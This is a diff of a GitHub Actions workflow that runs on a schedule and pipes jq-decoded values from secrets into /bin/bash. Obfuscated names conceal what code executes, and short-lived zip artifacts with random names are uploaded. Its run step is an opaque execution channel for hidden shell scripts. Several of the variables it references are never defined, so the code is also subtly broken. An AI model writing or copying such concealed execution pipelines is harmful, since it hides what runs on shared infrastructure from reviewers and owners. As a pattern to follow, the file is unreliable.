@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '5 1,7,13,19 * * *'
+    - cron: '0 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          phw0986: ${{ secrets.phw0986 }}
+          g6663: ${{ secrets.g6663 }}
         run: |
-          printf '%s' "$phw0986" | jq -r .kmo0400 | /bin/bash
-          printf '%s' "$kdz272" | jq -r .mg35638 | /bin/bash
-          printf '%s' "$lh869" | jq -r .pv60 | /bin/bash
+          printf '%s' "$g6663" | jq -r .hv4 | /bin/bash
+          echo $fqebl923 | jq -r .fzsvt87 | /bin/bash
+          echo $r37 | jq -r .b14190 | /bin/bash
+          printf '%s' "$xcii161" | jq -r .d09 | /bin/bash
+          echo $t5 | jq -r .x39 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: ooCy0zqo
+          name: 8pW4LTMt
           path: "*.zip"
           retention-days: 1
